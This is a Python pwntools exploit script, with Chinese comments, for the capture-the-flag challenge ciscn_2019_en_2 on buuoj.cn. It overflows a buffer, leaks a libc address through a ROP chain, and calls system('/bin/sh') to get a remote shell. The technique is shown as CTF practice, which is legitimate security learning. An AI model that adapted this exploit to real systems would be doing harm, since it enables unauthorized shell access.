'''
@Author       : 白银
@Date         : 2023-04-05 14:52:47
@LastEditors  : 白银
@LastEditTime : 2023-04-05 15:03:17
@FilePath     : /pwn/ciscn_2019_en_2.py
@Description  : https://buuoj.cn/challenges#ciscn_2019_en_2
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
from libcfind import *

set_arch = 0  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './ciscn_2019_en_2'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 27813)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    # libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x58  # ida看，上限和s差多少，加上r
# ROPgadget --binary ciscn_2019_en_2 --only "pop|ret"
pop_rdi_ret = 0x400c83 # 0x0000000000400c83 : pop rdi ; ret
ret_addr = 0x4006b9# 0x00000000004006b9 : ret
puts_plt = elf.plt['puts']
print("puts_plt------", hex(puts_plt))
puts_got = elf.got['puts']
print("puts_got------", hex(puts_got))
main_addr = elf.symbols['main']
print("main_addr------", hex(main_addr))

io.sendlineafter('Input your choice!\n', '1')

payload = flat(['a' * padding , pop_rdi_ret, puts_got, puts_plt, main_addr])
print(payload)
io.sendlineafter('Input your Plaintext to be encrypted\n', payload)
# io.recvuntil('Ciphertext\n')
io.recvline()
io.recvline()

puts_addr = u64(io.recv(6).ljust(8, b'\x00'))
# puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print("puts_addr------", hex(puts_addr))

libc = finder('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

io.sendlineafter('Input your choice!\n', '1')

payload2 = flat(['\x00', 'a' * (padding - 1), pop_rdi_ret, binsh_addr, ret_addr, system_addr]) # \x00截断strlen

sleep(1)
io.sendlineafter('encrypted\n', payload2)

io.interactive()